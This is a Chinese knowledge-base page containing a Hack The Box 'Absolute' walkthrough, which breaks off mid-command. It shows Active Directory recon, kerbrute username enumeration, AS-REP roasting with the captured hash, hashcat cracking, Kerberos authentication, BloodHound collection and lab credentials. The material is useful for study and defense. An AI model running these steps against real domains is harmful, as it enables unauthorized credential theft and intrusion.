---
title: ACL、Shadow Credentials 与 Kerberos 委派
date: '2026-11-25 12:00:00'
updated: '2026-11-25 12:00:00'
lang: zh-CN
permalink: knowledge/delegation/
categories:
- 身份与域安全
- 目录权限与委派
tags:
- 知识库
- Kerberos
- ACL
- gMSA
- Shadow Credentials
- KrbRelay
- DNS
- 委派
- RBCD
description: 域内权限变化通常表现为目录属性、组成员和票据的连续变化。本章保留 Absolute、Intelligence 和 Rebound 的原账户路径，分别标明认证限制、对象控制和委派前提。
knowledge: true
copyright: true
toc:
  enable: true
  number: false
  max_depth: 2
---

域内权限变化通常表现为目录属性、组成员和票据的连续变化。本章保留 Absolute、Intelligence 和 Rebound 的原账户路径，分别标明认证限制、对象控制和委派前提。

<nav class="kb-tools" aria-label="章节操作">
<a href="/knowledge/">知识库目录</a>
<a href="/guide/">研究导读</a>
<a href="/knowledge/delegation/source.md" download>下载 Markdown</a>
<button type="button" data-expand-evidence>展开全部技术记录</button>
</nav>

<!--more-->

## 分析重点

Absolute 的禁用 NTLM、交互登录权限与成员回滚影响每次工具调用。

Intelligence 连接 DNS、gMSA 与服务票据，时钟同步是原环境的实际问题。

Rebound 的继承 ACL、cross-session relay、KCD 与 RBCD 分支均保留原失败和成功返回。

## 案例与技术索引

| 分析入口 | 实验来源 | 技术点 |
| --- | --- | --- |
| [Kerberos 专用认证与 ACL 路径](#case-htb-absolute) | htb-absolute | Kerberos、ACL、Shadow Credentials、KrbRelay |
| [DNS 记录、gMSA 与服务委派](#case-intelligence) | intelligence | DNS、gMSA、Kerberos、委派 |
| [对象继承、跨会话 Relay 与 RBCD](#case-rebound) | rebound | Kerberos、RBCD、gMSA、ACL |

<a id="case-htb-absolute"></a>

## Kerberos 专用认证与 ACL 路径

禁用 NTLM、账户限制和组成员回滚影响工具选择。保留 AS-REP、BloodHound、Shadow Credentials、交互登录及 KrbRelay 的成功与失败分支。

<p class="kb-provenance">来源 htb-absolute · 原记录 2023-05-29 · 64 个代码块 · 22 处图片引用</p>

<details class="kb-evidence" id="record-htb-absolute">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start htb-absolute -->

#### 简述

本文是insane难度的HTB absolute机器的域渗透部分，其中大量的Kerberos，ACL，KrbRelay，bloodhound，Shadow Credentials Attack，ldap enumeration，PTH，GROUPS权限修改，interactive session等域渗透只是细节是此box的特色，主要参考[0xdf's blog absolute walkthrough](https://0xdf.gitlab.io/2023/05/27/htb-absolute.html)和[HTB的absolute官方writeup paper](https://app.hackthebox.com/machines/Absolute/walkthroughs)记录这篇博客加深记忆和理解，及供后续做深入研究查阅，备忘。

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Absolute.png)



#### 信息收集
#### nmap

``` bash
root@fdvoid0# nmap -p- --min-rate 10000 10.10.11.181
Starting Nmap 7.80 ( https://nmap.org ) at 2023-05-21 06:36 EDT
Nmap scan report for 10.10.11.181
Host is up (0.087s latency).
Not shown: 65509 closed ports
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49675/tcp open  unknown
49686/tcp open  unknown
49692/tcp open  unknown
49699/tcp open  unknown
49703/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 8.50 seconds

root@fdvoid0# nmap -sCV -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 10.10.11.181
Starting Nmap 7.80 ( https://nmap.org ) at 2023-05-21 06:37 EDT
Nmap scan report for 10.10.11.181
Host is up (0.088s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Absolute
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-05-21 17:38:06Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.absolute.htb
| Not valid before: 2022-06-09T08:14:24
|_Not valid after:  2023-06-09T08:14:24
|_ssl-date: 2023-05-21T17:40:40+00:00; +6h59m59s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.absolute.htb
| Not valid before: 2022-06-09T08:14:24
|_Not valid after:  2023-06-09T08:14:24
|_ssl-date: 2023-05-21T17:40:39+00:00; +7h00m00s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.absolute.htb
| Not valid before: 2022-06-09T08:14:24
|_Not valid after:  2023-06-09T08:14:24
|_ssl-date: 2023-05-21T17:40:40+00:00; +6h59m59s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.absolute.htb
| Not valid before: 2022-06-09T08:14:24
|_Not valid after:  2023-06-09T08:14:24
|_ssl-date: 2023-05-21T17:40:39+00:00; +7h00m00s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=5/21%Time=6469F493%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2023-05-21T17:40:25
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 161.96 seconds
```

IIS版本表明Absolute正在运行Windows 10/Server 2016或更高版本。LDAP扫描显示了dc.absolute.htb的hostname。现在把它和基本域添加到的/etc/hosts文件中:

``` bash
10.10.11.181 dc.absolute.htb absolute.htb
```

有一个7小时的时差，如果要做任何Kerberos相关的认证需要注意。

注意到WinRM(5985)在找到creds时是打开的

#### SMB - TCP 445

无法在没有密码的情况下连接到SMB:

``` bash
┌──(root💀kali)-[~/hackthebox/machine/absolute]
└─# crackmapexec smb 10.10.11.181 --shares
SMB         10.10.11.181    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.181    445    DC               [-] Error enumerating shares: STATUS_USER_SESSION_DELETED

┌──(root💀kali)-[~/hackthebox/machine/absolute]
└─# crackmapexec smb 10.10.11.181 --shares -u fd0 -p ''
SMB         10.10.11.181    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.181    445    DC               [-] absolute.htb\fd0: STATUS_LOGON_FAILURE
```

#### LDAP - TCP 389+

Ldapsearch将给出基本命名上下文，它与absolute.htb匹配:

``` bash
┌──(root💀kali)-[~/hackthebox/machine/absolute]
└─# ldapsearch -H ldap://dc.absolute.htb -x -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts
#

#
dn:
namingcontexts: DC=absolute,DC=htb
namingcontexts: CN=Configuration,DC=absolute,DC=htb
namingcontexts: CN=Schema,CN=Configuration,DC=absolute,DC=htb
namingcontexts: DC=DomainDnsZones,DC=absolute,DC=htb
namingcontexts: DC=ForestDnsZones,DC=absolute,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

尝试获取任何额外信息需要认证:

``` bash
┌──(root💀kali)-[~/hackthebox/machine/absolute]
└─# ldapsearch -H ldap://dc.absolute.htb -x -b "DC=absolute,DC=htb"
# extended LDIF
#
# LDAPv3
# base <DC=absolute,DC=htb> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1
```

#### DNS - TCP/UDP 53

可以尝试一个zone transfer，但失败了:

``` bash
┌──(root💀kali)-[~/hackthebox/machine/absolute]
└─# dig +noall +answer @10.10.11.181 axfr absolute.htb                                                                            1 ⨯
; Transfer failed.
```

可以确认已经知道的两个名字:

``` bash
┌──(root💀kali)-[~/hackthebox/machine/absolute]
└─# dig +noall +answer @10.10.11.181 absolute.htb
absolute.htb.           600     IN      A       10.10.11.181

┌──(root💀kali)-[~/hackthebox/machine/absolute]
└─# dig +noall +answer @10.10.11.181 dc.absolute.htb
dc.absolute.htb.        1200    IN      A       10.10.11.181
```

用dnsenum暴力破解子域。确认在上面手动识别的内容，并通过暴力破解找到了其他子域:

``` bash
┌──(root💀kali)-[~/hackthebox/machine/absolute]
└─# dnsenum --dnsserver 10.10.11.181 -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt absolute.htb
dnsenum VERSION:1.2.6

-----   absolute.htb   -----


Host's addresses:
__________________

absolute.htb.                            600      IN    A        10.10.11.181


Name Servers:
______________

dc.absolute.htb.                         1200     IN    A        10.10.11.181


Mail (MX) Servers:
___________________



Trying Zone Transfers and getting Bind Versions:
_________________________________________________

unresolvable name: dc.absolute.htb at /usr/bin/dnsenum line 900.

Trying Zone Transfer for absolute.htb on dc.absolute.htb ...
AXFR record query failed: no nameservers


Brute forcing with /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:
______________________________________________________________________________________

dc.absolute.htb.                         1200     IN    A        10.10.11.181
gc._msdcs.absolute.htb.                  600      IN    A        10.10.11.181
domaindnszones.absolute.htb.             600      IN    A        10.10.11.181
forestdnszones.absolute.htb.             600      IN    A        10.10.11.181

absolute.htb class C netranges:
________________________________


Performing reverse lookup on 0 ip addresses:
_____________________________________________

0 results out of 0 IP addresses.

absolute.htb ip blocks:
________________________

done.
```

然而这些都没什么用。

#### Website - TCP 80

该网站是一个专注于设计和图像的简单页面:

图像每隔几秒旋转一次。唯一的链接指向模板。

#### 技术栈

HTTP响应头只表示IIS，没有其他内容:

``` bash
HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Tue, 07 Jun 2022 19:29:10 GMT
Accept-Ranges: bytes
ETag: "0877fdca47ad81:0"
Server: Microsoft-IIS/10.0
Date: Sun, 21 May 2023 23:50:51 GMT
Connection: close
Content-Length: 2909
```

首页本身加载为index.html，这表明它可能只是一个静态站点。

404页面看起来很像IIS默认的404。

旋转的图片似乎是在一个 hero-slider 和 owl-carousel div:

#### 目录爆破

使用feroxbuster:

``` bash
┌──(root💀kali)-[~/hackthebox/machine/absolute]
└─# feroxbuster -u http://absolute.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://absolute.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        2l       10w      146c http://absolute.htb/js => http://absolute.htb/js/
200      GET       85l      196w     2909c http://absolute.htb/
301      GET        2l       10w      150c http://absolute.htb/images => http://absolute.htb/images/
301      GET        2l       10w      147c http://absolute.htb/css => http://absolute.htb/css/
301      GET        2l       10w      150c http://absolute.htb/Images => http://absolute.htb/Images/
301      GET        2l       10w      149c http://absolute.htb/fonts => http://absolute.htb/fonts/
301      GET        2l       10w      147c http://absolute.htb/CSS => http://absolute.htb/CSS/
301      GET        2l       10w      146c http://absolute.htb/JS => http://absolute.htb/JS/
301      GET        2l       10w      146c http://absolute.htb/Js => http://absolute.htb/Js/
301      GET        2l       10w      147c http://absolute.htb/Css => http://absolute.htb/Css/
301      GET        2l       10w      150c http://absolute.htb/IMAGES => http://absolute.htb/IMAGES/
301      GET        2l       10w      149c http://absolute.htb/Fonts => http://absolute.htb/Fonts/
301      GET        2l       10w      147c http://absolute.htb/CSS => http://absolute.htb/CSS/
200      GET     7808l    48362w  3771054c http://absolute.htb/images/hero_4.jpg
301      GET        2l       10w      146c http://absolute.htb/JS => http://absolute.htb/JS/
301      GET        2l       10w      146c http://absolute.htb/Js => http://absolute.htb/Js/
301      GET        2l       10w      147c http://absolute.htb/Css => http://absolute.htb/Css/
200      GET     6692l    42749w  3290518c http://absolute.htb/images/hero_5.jpg
200      GET        7l      277w    44342c http://absolute.htb/js/owl.carousel.min.js
301      GET        2l       10w      150c http://absolute.htb/IMAGES => http://absolute.htb/IMAGES/
403      GET       29l       92w     1233c http://absolute.htb/fonts/icomoon/
200      GET    22590l   126364w  9918283c http://absolute.htb/images/hero_6.jpg
301      GET        2l       10w      163c http://absolute.htb/fonts/icomoon/fonts => http://absolute.htb/fonts/icomoon/fonts/
200      GET     1306l     7961w   733740c http://absolute.htb/images/hero_1.jpg
200      GET      948l     7256w   690337c http://absolute.htb/images/hero_3.jpg
200      GET      145l      442w     4030c http://absolute.htb/css/style.css
301      GET        2l       10w      149c http://absolute.htb/Fonts => http://absolute.htb/Fonts/
200      GET        7l      689w    63240c http://absolute.htb/js/bootstrap.min.js
200      GET        2l     1283w    86926c http://absolute.htb/js/jquery-3.3.1.min.js
200      GET     4919l     8218w    79820c http://absolute.htb/fonts/icomoon/style.css
200      GET        7l     2103w   160392c http://absolute.htb/css/bootstrap.min.css
...[snip]...
```

没发现其它有用的东西

#### Auth as d.klay
#### 生成 Username 字典
#### Image Metadata

使用一个简单的Bash循环从carousel下载六个"hero"图片，

``` bash
for i in $(seq 1 6); do wget http://absolute.htb/images/hero_${i}.jpg; done
```

使用exiftool查看图像上的元数据:

``` bash
┌──(root💀kali)-[~/hackthebox/machine/absolute]
└─# exiftool hero_1.jpg
ExifTool Version Number         : 12.57
File Name                       : hero_1.jpg
Directory                       : .
File Size                       : 407 kB
File Modification Date/Time     : 2022:06:07 15:45:20-04:00
File Access Date/Time           : 2023:05:29 02:44:24-04:00
File Inode Change Date/Time     : 2023:05:29 02:44:24-04:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Little-endian (Intel, II)
X Resolution                    : 72
Y Resolution                    : 72
Resolution Unit                 : inches
Artist                          : James Roberts
Y Cb Cr Positioning             : Centered
Quality                         : 60%
XMP Toolkit                     : Image::ExifTool 11.88
Author                          : James Roberts
Creator Tool                    : Adobe Photoshop CC 2018 Macintosh
Derived From Document ID        : 6413FD608B5C21D0939F910C0EFBBE44
Derived From Instance ID        : 6413FD608B5C21D0939F910C0EFBBE44
Document ID                     : xmp.did:887A47FA048811EA8574B646AF4FC464
Instance ID                     : xmp.iid:887A47F9048811EA8574B646AF4FC464
DCT Encode Version              : 100
APP14 Flags 0                   : [14], Encoded with Blend=1 downsampling
APP14 Flags 1                   : (none)
Color Transform                 : YCbCr
Image Width                     : 1900
Image Height                    : 1150
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 1900x1150
Megapixels                      : 2.2
```

James Roberts是“Author” 和 “Artist”。其他的没有“Artist”，但他们都有一个“Author”字段。

#### Generate Users List

有了users列表，就可以测试Kerberos，看看是否有有效的用户名。得到一个users列表:

``` bash
┌──(root💀kali)-[~/hackthebox/machine/absolute]
└─# for i in $(seq 1 6); do exiftool hero_${i}.jpg | grep Author | awk '{print $3 " " $4}'; done | tee users
James Roberts
Michael Chaffrey
Donald Klay
Sarah Osvald
Jeffer Robinson
Nicole Smith
```

可以采用这些方法并手工生成可能的常用用户名列表，但使用[username-anarchy](https://github.com/urbanadventurer/username-anarchy)生成用户名列表更容易:

``` bash
┌──(root💀kali)-[~/hackthebox/machine/absolute]
└─# /root/username-anarchy/username-anarchy -i users | tee usernames
james
jamesroberts
james.roberts
jamesrob
jamerobe
jamesr
j.roberts
jroberts
rjames
r.james
robertsj
roberts
roberts.j
roberts.james
jr
michael
michaelchaffrey
michael.chaffrey
...[snip]...
```

#### 寻找有效用户名

kerbrute是一种使用Kerberos进行暴力破解的工具。其中一个选项，userenum将检查字典中的哪些名称是有效的用户名:

``` bash
┌──(root💀kali)-[~/hackthebox/machine/absolute]
└─# /root/kerbrute-master/kerbrute userenum --dc dc.absolute.htb -d absolute.htb usernames

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (n/a) - 05/29/23 - Ronnie Flathers @ropnop

2023/05/29 03:06:48 >  Using KDC(s):
2023/05/29 03:06:48 >   dc.absolute.htb:88

2023/05/29 03:06:49 >  [+] VALID USERNAME:       j.roberts@absolute.htb
2023/05/29 03:06:49 >  [+] VALID USERNAME:       m.chaffrey@absolute.htb
2023/05/29 03:06:51 >  [+] VALID USERNAME:       s.osvald@absolute.htb
2023/05/29 03:06:51 >  [+] VALID USERNAME:       j.robinson@absolute.htb
2023/05/29 03:06:51 >  [+] VALID USERNAME:       d.klay@absolute.htb
2023/05/29 03:06:52 >  [+] VALID USERNAME:       n.smith@absolute.htb
2023/05/29 03:06:57 >  Done! Tested 88 usernames (6 valid) in 8.120 seconds
```

很明显，这个domain使用的是[first initial].[lastname]作为用户名的语法。

或者，crackmapexec也可以完成这个爆破任务

#### AS-Rep-Roast
#### 抓取hash

没有密码，仍然无法连接到域来尝试Bloodhound或Kerberoasting。检查AS-Rep-Roast-able用户:

``` bash
┌──(root💀kali)-[~/hackthebox/machine/absolute]
└─# GetNPUsers.py -dc-ip dc.absolute.htb -usersfile valid_users absolute.htb/                                                     1 ⨯
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User j.roberts@absolute.htb doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User m.chaffrey@absolute.htb doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User s.osvald@absolute.htb doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j.robinson@absolute.htb doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$d.klay@absolute.htb@ABSOLUTE.HTB:7babac3563f9d82cdd68fc5f6a8c35bf$6f67d29d9f1811e4fe60990d208c59ecf1850e55cc44ac5d2d31e8db12d663b514a2ab8f186fb70475960feffa9244139f153276a20dcbe4aa8d39739f419e6d19c13d4304c167c3854afa3da678b0594aa746b8f42ad39ef55c20aa501f817ba52722ab2c75b5eaeddf5ef8008bd3e61b2d19b672b7bb1db571b5c8d6cfe3ae357c731fa8c9bea2dad013b5b3439b2b0c4cbaff742d08dcfc1f7217f4c1818face9910b051b19567bdf0a0d68d715750d7cbad67c2c56064d1b8e5c3bdf7604fa408f76fc72012061bd2de8be211d57dddb04f93bf4122cb8d8a3d82be8c18e472184e798ae2477d70dea34
[-] User n.smith@absolute.htb doesn't have UF_DONT_REQUIRE_PREAUTH set
```

d.klay is vulnerable.

#### 破解密码

使用hashcat和rockyou.txt字典来破解密码

``` bash
hashcat.exe password.txt rockyou.txt

Dictionary cache hit:
* Filename..: rockyou.txt
* Passwords.: 14344386
* Bytes.....: 139921360
* Keyspace..: 14344386

$krb5asrep$23$d.klay@absolute.htb@ABSOLUTE.HTB:7babac3563f9d82cdd68fc5f6a8c35bf$6f67d29d9f1811e4fe60990d208c59ecf1850e55cc44ac5d2d31e8db12d663b514a2ab8f186fb70475960feffa9244139f153276a20dcbe4aa8d39739f419e6d19c13d4304c167c3854afa3da678b0594aa746b8f42ad39ef55c20aa501f817ba52722ab2c75b5eaeddf5ef8008bd3e61b2d19b672b7bb1db571b5c8d6cfe3ae357c731fa8c9bea2dad013b5b3439b2b0c4cbaff742d08dcfc1f7217f4c1818face9910b051b19567bdf0a0d68d715750d7cbad67c2c56064d1b8e5c3bdf7604fa408f76fc72012061bd2de8be211d57dddb04f93bf4122cb8d8a3d82be8c18e472184e798ae2477d70dea34:Darkmoonsky248girl

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$d.klay@absolute.htb@ABSOLUTE.HTB:7bab...0dea34
Time.Started.....: Mon May 29 15:56:06 2023 (1 sec)
Time.Estimated...: Mon May 29 15:56:07 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 18230.5 kH/s (9.04ms) @ Accel:1024 Loops:1 Thr:32 Vec:1
Speed.#3.........:   240.9 kH/s (15.66ms) @ Accel:32 Loops:1 Thr:8 Vec:1
Speed.#*.........: 18471.4 kH/s
Recovered........: 1/1 (100.00%) Digests
Progress.........: 12746752/14344386 (88.86%)
Rejected.........: 0/12746752 (0.00%)
Restore.Point....: 11149312/14344386 (77.73%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Restore.Sub.#3...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: Fake@smile -> 26101959
Candidates.#3....: 26101956 -> 2591928
Hardware.Mon.#1..: Temp: 54c Util: 34% Core: 210MHz Mem:6000MHz Bus:8
Hardware.Mon.#3..: N/A

Started: Mon May 29 15:55:43 2023
Stopped: Mon May 29 15:56:09 2023
```

密码为: Darkmoonsky248girl

#### Kerberos 认证
#### 使用CME验证

使用 crackmapexec 验证失败:

``` bash
┌──(root💀kali)-[~/hackthebox/machine/absolute]
└─# crackmapexec smb 10.10.11.181 -u d.klay -p 'Darkmoonsky248girl'
SMB         10.10.11.181    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.181    445    DC               [-] absolute.htb\d.klay:Darkmoonsky248girl STATUS_ACCOUNT_RESTRICTION
```

STATUS_ACCOUNT_RESTRICTION 通常意味着禁用了NTLM，并且需要使用Kerberos进行身份验证。

``` bash
┌──(root💀kali)-[~/hackthebox/machine/absolute]
└─# crackmapexec smb 10.10.11.181 -u d.klay -p 'Darkmoonsky248girl' -k
SMB         10.10.11.181    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.181    445    DC               [-] absolute.htb\d.klay: KRB_AP_ERR_SKEW

┌──(root💀kali)-[~/hackthebox/machine/absolute]
└─# ntpdate -u dc.absolute.htb
2023-05-29 12:14:09.677756 (-0400) +25203.214272 +/- 0.465428 dc.absolute.htb 10.10.11.181 s1 no-leap
CLOCK: time stepped by 25203.214272

┌──(root💀kali)-[~/hackthebox/machine/absolute]
└─# crackmapexec smb 10.10.11.181 -u d.klay -p 'Darkmoonsky248girl' -k
SMB         10.10.11.181    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.181    445    DC               [+] absolute.htb\d.klay:Darkmoonsky248girl
```

#### kinit

配置/etc/krb5.conf文件

``` bash
[libdefaults]
    default_realm = ABSOLUTE.HTB
    kdc_timesync = 1
    ccache_type = 4
    forwardable = true
    proxiable = true
    fcc-mit-ticketflags = true
[realms]
    ABSOLUTE.HTB = {
        kdc = dc.absolute.htb
        admin_server = dc.absolute.htb
        default_domain = absolute.htb
    }
```

有些工具(如crackmapexec)可以单独使用Kerberos。对于其它工具，我需要一个ticket。可以用kinit生成一个:

``` bash
┌──(root💀kali)-[~/hackthebox/machine/absolute]
└─# kinit d.klay
Password for d.klay@ABSOLUTE.HTB:

┌──(root💀kali)-[~/hackthebox/machine/absolute]
└─# klist
Ticket cache: FILE:/tmp/krb5cc_0
Default principal: d.klay@ABSOLUTE.HTB

Valid starting       Expires              Service principal
05/29/2023 12:32:30  05/29/2023 16:32:30  krbtgt/ABSOLUTE.HTB@ABSOLUTE.HTB
        renew until 05/29/2023 16:32:30
```

Klist显示这已经在/tmp/krb5cc_1000中创建了一个ticket和其他ticket细节。

如果我的时间和DC的时间之间的时钟偏差太大，将会失败。在VirtualBox中，停止同步时钟。

``` bash
sudo service vboxadd-service stop
```

然后运行sudo ntupdate 10.10.11.181。

#### Auth as svc_smb
#### Bloodhound

有了密码凭证后，可以使用[BloodHound.py](https://github.com/fox-it/BloodHound.py)收集bloodhound数据

``` bash
┌──(root💀kali)-[~/hackthebox/machine/absolute]
└─# bloodhound-python -u d.klay -p 'Darkmoonsky248girl' -k -d absolute.htb -dc dc.absolute.htb -ns 10.10.11.181 -c ALL --zip      1 ⨯
INFO: Found AD domain: absolute.htb
INFO: Using TGT from cache
INFO: Found TGT with correct principal in ccache file.
INFO: Connecting to LDAP server: dc.absolute.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.absolute.htb
INFO: Found 18 users
INFO: Found 55 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.absolute.htb
INFO: Done in 01M 56S
INFO: Compressing output into 20230529130934_bloodhound.zip
```

将zip文件上传到Bloodhound, 然后找到d.klay, 标记为已拿下:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Absolute1.png)

不幸的是，这个用户没有本地管理权限，没有执行权限，也没有出站对象控制权限:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Absolute2.png)

#### SMB

有了creds，可以看看SMB shares:

``` bash
┌──(root💀kali)-[~/hackthebox/machine/absolute]
└─# crackmapexec smb dc.absolute.htb -k -u d.klay -p 'Darkmoonsky248girl' --shares
SMB         dc.absolute.htb 445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         dc.absolute.htb 445    DC               [+] absolute.htb\d.klay:Darkmoonsky248girl
SMB         dc.absolute.htb 445    DC               [+] Enumerated shares
SMB         dc.absolute.htb 445    DC               Share           Permissions     Remark
SMB         dc.absolute.htb 445    DC               -----           -----------     ------
SMB         dc.absolute.htb 445    DC               ADMIN$                          Remote Admin
SMB         dc.absolute.htb 445    DC               C$                              Default share
SMB         dc.absolute.htb 445    DC               IPC$            READ            Remote IPC
SMB         dc.absolute.htb 445    DC               NETLOGON        READ            Logon server share
SMB         dc.absolute.htb 445    DC               Shared
SMB         dc.absolute.htb 445    DC               SYSVOL          READ            Logon server share
```

使用Impacket的smbclient.py来连接, 可以列出共享，并连接到一个共享，如SYSVOL:

``` bash
┌──(root💀kali)-[~/hackthebox/machine/absolute]
└─# smbclient.py 'absolute.htb/svc_smb:AbsoluteSMBService123!@dc.absolute.htb' -k -no-pass                                      130 ⨯
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] CCache file is not found. Skipping...
Type help for list of commands
# shares
ADMIN$
C$
IPC$
NETLOGON
Shared
SYSVOL
# use SYSVOL
# ls
drw-rw-rw-          0  Thu Jun  9 04:16:22 2022 .
drw-rw-rw-          0  Thu Jun  9 04:16:22 2022 ..
drw-rw-rw-          0  Thu Jun  9 04:16:22 2022 absolute.htb
```

然而并没有更多有用的东西

#### CrackMapExec

现在，可以连接到LDAP。使用Crackmapexec拉出用户列表:

``` bash
┌──(root💀kali)-[~/hackthebox/machine/absolute]
